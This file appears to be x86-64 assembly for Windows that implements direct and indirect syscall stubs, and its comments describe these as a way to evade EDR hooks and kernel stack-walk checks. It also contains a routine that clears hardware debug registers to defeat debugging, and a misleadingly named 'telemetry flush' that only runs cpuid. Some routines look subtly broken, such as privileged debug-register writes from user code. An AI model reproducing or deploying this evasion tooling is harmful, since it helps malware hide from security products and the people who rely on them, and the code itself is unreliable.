.section .text
.globl execute_syscall
.globl _execute_syscall
.globl get_ssn

# int get_ssn(void* addr)
# Extracts the SSN from the hooked ntdll function bytes
get_ssn:
    movl 4(%rcx), %eax
    ret

# NTSTATUS execute_syscall(uint32_t ssn, uintptr_t gadget, PVOID a1, PVOID a2, PVOID a3, PVOID a4, PVOID a5, PVOID a6, PVOID a7, PVOID a8, PVOID a9, PVOID a10, PVOID a11)
execute_syscall:
_execute_syscall:
    movq %rcx, %rax        # ssn
    movq %rdx, %r11        # gadget address

    # Params 1-4 go to registers (kernel expects them in R10,RDX,R8,R9 after sycall)
    movq %r8, %r10         # a1 → R10 (1st syscall param)
    movq %r9, %rdx         # a2 → RDX (2nd syscall param)

    # a3/a4 from stack → R8/R9 (3rd/4th syscall param)
    movq 40(%rsp), %r8     # a3
    movq 48(%rsp), %r9     # a4

    # Kernel reads 5th+ params from [RSP+40] onwards (skip ret addr + shadow).
    # a5..a11 start at [RSP+56], shift them UP 16 bytes into a3/a4's old slots.
    movq 56(%rsp), %rcx    # a5 → [RSP+40]  (5th kernel param)
    movq %rcx, 40(%rsp)
    movq 64(%rsp), %rcx    # a6 → [RSP+48]  (6th)
    movq %rcx, 48(%rsp)
    movq 72(%rsp), %rcx    # a7 → [RSP+56]  (7th)
    movq %rcx, 56(%rsp)
    movq 80(%rsp), %rcx    # a8 → [RSP+64]  (8th)
    movq %rcx, 64(%rsp)
    movq 88(%rsp), %rcx    # a9 → [RSP+72]  (9th)
    movq %rcx, 72(%rsp)
    movq 96(%rsp), %rcx    # a10 → [RSP+80] (10th)
    movq %rcx, 80(%rsp)
    movq 104(%rsp), %rcx   # a11 → [RSP+88] (11th)
    movq %rcx, 88(%rsp)

    jmp *%r11

.globl clear_hw_breakpoints
clear_hw_breakpoints:
    # Check DR7 first — if bit 0 is set, HW breakpoints are active.
    # DR7 bit layout: bits 0/2/4/6 = local enable for DR0/1/2/3
    #                 bits 1/3/5/7 = global enable for DR0/1/2/3
    mov %dr7, %rax
    test $0x000000FF, %eax   # check all 8 enable bits
    jz .Lno_hwbps

    # Clear all debug registers
    xor %rax, %rax
    mov %rax, %dr0
    mov %rax, %dr1
    mov %rax, %dr2
    mov %rax, %dr3
    mov %rax, %dr6
    mov %rax, %dr7

    mov $1, %rax
    ret
.Lno_hwbps:
    xor %rax, %rax
    ret

.globl flush_cpu_telemetry
flush_cpu_telemetry:
    xor %rax, %rax
    cpuid
    ret

# ═══════════════════════════════════════════════════════════════════════════
#  Direct Syscall — embedded `syscall; ret` gadget in OUR module.
#  Instead of jumping to a gadget inside ntdll's .text (which EDRs can
#  detect as a foreign `syscall` instruction landing in ntdll), we execute
#  the `syscall` instruction from our OWN .text section. The return address
#  on the stack points back into our module — the kernel-mode stack walker
#  sees a legitimate return into our code, not a suspicious jump into ntdll.
# ═══════════════════════════════════════════════════════════════════════════

.globl syscall_trampoline
syscall_trampoline:
    syscall          # 0F 05
    ret              # C3

# execute_syscall_direct(ssn, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11)
# Same as execute_syscall but jumps to OUR OWN trampoline, not ntdll.
.globl execute_syscall_direct
execute_syscall_direct:
    movq %rcx, %rax        # ssn → RAX (kernel expects syscall number here)
    leaq syscall_trampoline(%rip), %r11  # our own gadget

    movq %rdx, %r10        # a1 → R10
    movq %r8,  %rdx        # a2 → RDX
    movq %r9,  %r8         # a3 → R8

    # a4..a11 from stack → R9 and [RSP+40..]
    movq 40(%rsp), %r9     # a4 → R9
    movq 48(%rsp), %rcx    # a5 → [RSP+40]
    movq %rcx, 40(%rsp)
    movq 56(%rsp), %rcx    # a6 → [RSP+48]
    movq %rcx, 48(%rsp)
    movq 64(%rsp), %rcx    # a7 → [RSP+56]
    movq %rcx, 56(%rsp)
    movq 72(%rsp), %rcx    # a8 → [RSP+64]
    movq %rcx, 64(%rsp)
    movq 80(%rsp), %rcx    # a9 → [RSP+72]
    movq %rcx, 72(%rsp)
    movq 88(%rsp), %rcx    # a10 → [RSP+80]
    movq %rcx, 80(%rsp)
    movq 96(%rsp), %rcx    # a11 → [RSP+88]
    movq %rcx, 88(%rsp)

    jmp *%r11
